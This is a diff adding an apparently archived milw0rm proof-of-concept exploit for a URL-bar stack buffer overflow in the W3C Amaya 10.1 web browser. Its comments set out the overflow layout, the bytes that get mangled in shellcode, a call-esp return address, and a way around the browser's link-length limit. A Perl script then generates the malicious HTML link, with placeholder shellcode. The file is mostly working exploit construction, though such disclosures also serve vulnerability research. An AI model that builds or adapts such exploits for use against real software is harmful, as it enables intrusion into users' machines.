@@ -1,0 +1,55 @@
+#            W3C Amaya 10.1 Web Browser
+#
+# Amaya (URL Bar) Remote Stack Overflow Vulnerability
+#
+# Written and discovered by: 
+# r0ut3r (writ3r [at] gmail.com / www.bmgsec.com.au)
+#
+# Advisory: http://www.bmgsec.com.au/advisory/40/
+# ------------------------------------------------------
+#
+# Shellcode notes: 
+# The application fails to correctly process certain bytes: 
+# 0x9c becomes 0x9cc2
+# Similar events occur with different bytes (0xf8, 0xfb, 0xbe, 0x93, 0xab, 0xaf 0xeb). 
+#
+# After reviewing the source code, the below function modifies the
+# shellcode:  
+# Line 902: int TtaWCToMBstring (wchar_t src, unsigned char **dest)
+#
+# The max value which can be used is 0x1fffff <-- Thanks Luigi!
+# ------------------------------------------------------
+# 
+# The URL bar contains a buffer overflow vulnerability: 
+# buffer length: 1600 bytes
+#
+# [junk] + [eip] +     [shellcode]
+#  1600  +   4   +  sizeof(shellcode)
+#
+# ESP points to data after EIP. 
+#
+# I found it difficult to access the URL bar via HTML code. For example, compile the above code, 
+# write it to a HTML file, then load it into the browser. Attempt to click the link and
+# you will notice there is a 800 character limit on the link. 
+#
+# To bypass this problem click the link then select "Links" >> "Create or change link...". 
+# Now click "Confirm". Alternatively just copy the payload into the URL bar. 
+#
+# URL Bar Proof of concept: 
+# ----------------------------------------------------
+#!/usr/bin/perl
+
+use warnings;
+use strict;
+
+my $shellcode = 'C' x 80;
+
+# 0x7D035F53 -> \x53\x5f\x03\x7d <-- Bingo! (call esp)
+my $data   =       '<a href="' .
+                        'A' x 1600 .
+                        "\x53\x5f\x03\x7d" . # eip (ESP points to stuff after RET, so shellcode)
+                        $shellcode . 
+                        '">r0ut3r</a>';
+print $data;
+
+# milw0rm.com [2008-11-24]
